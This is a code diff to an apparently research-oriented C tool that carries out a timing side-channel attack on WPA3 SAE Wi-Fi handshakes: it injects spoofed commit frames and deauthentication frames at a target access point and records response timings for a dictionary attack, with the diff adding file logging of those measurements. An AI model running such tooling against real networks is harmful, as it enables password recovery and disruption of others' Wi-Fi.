@@ -191,22 +191,6 @@ unsigned char DEAUTH_FRAME[] =
 	"\x2c\xb0\x5d\x5b\xd2\x65\x60\x5f\x03\x00";
 size_t DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;
 
-static void sighandler(int signum)
-{
-	if (signum == SIGPIPE)
-	{
-		printf("broken pipe!\n");
-	} 
-	else if (signum == SIGINT)
-	{
-		time_t t = time(NULL);
-		struct tm tm = *localtime(&t);
-		printf("Stopping at: %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
-
-		exit(0);
-	}
-}
-
 struct state_ecc {
 	const EC_GROUP *group;
 	const EC_POINT *generator;
@@ -226,6 +210,8 @@ static struct state
 	unsigned char srcaddr[6];
 	int debug_level;
 	int group;
+	const char *output_file;
+	FILE *fp;
 
 	// Timing specific
 	struct timespec prev_commit;
@@ -246,6 +232,24 @@ static struct state
 } _state;
 
 static struct state * get_state(void) { return &_state; }
+
+static void sighandler(int signum)
+{
+	struct state *state = get_state();
+
+	if (signum == SIGPIPE || signum == SIGINT)
+	{
+		time_t t = time(NULL);
+		struct tm tm = *localtime(&t);
+
+		if (state->fp != NULL)
+			fprintf(state->fp, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+		else
+			printf("Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+
+		exit(0);
+	}
+}
 
 static void debug(struct state *state, int level, char *fmt, ...)
 {
@@ -302,9 +306,9 @@ static inline int card_get_mac(struct state *state, unsigned char * mac)
 static void
 open_card(struct state *state, char * dev, int chan)
 {
-	fprintf(stderr, "Opening card %s\n", dev);
+	printf("Opening card %s\n", dev);
 	card_open(state, dev);
-	fprintf(stderr, "Setting chan %d\n", chan);
+	printf("Setting chan %d\n", chan);
 	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
 }
 
@@ -519,6 +523,8 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 		// TODO: Verify this is a beacon frame
 		printf("Detected AP! Starting timing attack at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
 			tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+		fprintf(state->fp, "Starting at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
+			tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
 
 		state->started_attack = 1;
 		inject_sae_commit(state);
@@ -545,15 +551,16 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 			state->sum_time[state->curraddr] += diff.tv_nsec;
 			state->num_injected[state->curraddr] += 1;
 
+			// Write measurement to file
+			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);
+
+			// Also provide output to the screen			
 			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
 				state->num_injected[state->curraddr]);
-			fflush(stdout);
-
-			// Print out a summary while running to stderr. Results can be captured from stdout.
 			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
-				fprintf(stderr, "-------------------------------\n");
+				printf("-------------------------------\n");
 				for (int i = 0; i < state->num_addresses; ++i)
-					fprintf(stderr, "Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
+					printf("Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
 			}
 
 			inject_deauth(state);
@@ -660,13 +667,21 @@ static void event_loop(struct state *state, char * dev, int chan)
 	card_set_rate(state, USED_RATE);
 	card_get_mac(state, state->srcaddr);
 
-	// 2. Display all info we need to perform the dictionary attack
+	// 2. Display all info we need to perform the dictionary attack & also write it to file
 	printf("Targeting BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0], state->bssid[1],
 		state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
 	printf("Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
 		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
 	printf("Performing attack using group %d\n", state->group);
 	printf("Using a retransmit timeout of %d ms, and a delay between commits of %d ms\n", state->timeout, state->delay);
+
+	fprintf(state->fp, "BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0],
+		state->bssid[1], state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
+	fprintf(state->fp, "Spoofing %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
+		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
+	fprintf(state->fp, "Group %d\n", state->group);
+	fprintf(state->fp, "Timeout %d\n", state->timeout);
+	fprintf(state->fp, "Delay %d\n", state->delay);
 
 	// 3. Initialize futher things to start the attack
 	state->srcaddr[5] = state->curraddr;
@@ -693,7 +708,7 @@ static void event_loop(struct state *state, char * dev, int chan)
 		perror("timerfd_create()");
 
 	// 6. Now start the main event loop
-	fprintf(stderr, "Searching for AP ...\n");
+	printf("Searching for AP ...\n");
 	while (1)
 	{
 		card_fd = wi_fd(state->wi);
@@ -822,7 +837,7 @@ int initialize_ecc_crypto(struct state_ecc *state_ecc, int group)
 		return -1;
 	}
 
-	fprintf(stderr, "Initialized ECC crypto parameters\n");
+	printf("Initialized ECC crypto parameters\n");
 
 	BN_free(randbn);
 	return 0;
@@ -866,6 +881,7 @@ static void usage(char * p)
 		   "       -d <iface>   : Wifi interface to use\n"
 		   "       -c  <chan>   : Channel to use\n"
 		   "       -a bssid     : Target Access Point MAC address\n"
+		   "       -o file      : File to write the measurements to\n"
 		   "       -g group     : The curve to use (either 19 or 21)\n"
 		   "       -v <level>   : Debug level (1 to 3; default: 1)\n"
 		   "       -i <inter>   : Delay between two injects in ms\n"
@@ -893,7 +909,7 @@ int main(int argc, char * argv[])
 	state->timeout = 750;
 	state->num_addresses = 20;
 
-	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:")) != -1)
+	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:o:")) != -1)
 	{
 		switch (ch)
 		{
@@ -938,6 +954,10 @@ int main(int argc, char * argv[])
 				}
 				break;
 
+			case 'o':
+				state->output_file = strdup(optarg);
+				break;
+
 			case 'h':
 			default:
 				usage(argv[0]);
@@ -953,6 +973,20 @@ int main(int argc, char * argv[])
 		usage(argv[0]);
 	if ((state->group < 22 || state->group > 24) && initialize_ecc_crypto(&state->ecc, state->group)) {
 		fprintf(stderr, "Group %d is not supported\n", state->group);
+		exit(1);
+	}
+	if (state->output_file == NULL) {
+		fprintf(stderr, "Please provide an output file using the -o parameter\n");
+		exit(1);
+	} else if (access(state->output_file, F_OK) != -1) {
+		fprintf(stderr, "The output file %s already exists\n", state->output_file);
+		exit(1);
+	}
+
+	state->fp = fopen(state->output_file, "w");
+	if (state->fp == NULL) {
+		fprintf(stderr, "Failed to open %s: ", state->output_file);
+		perror("");
 		exit(1);
 	}
 
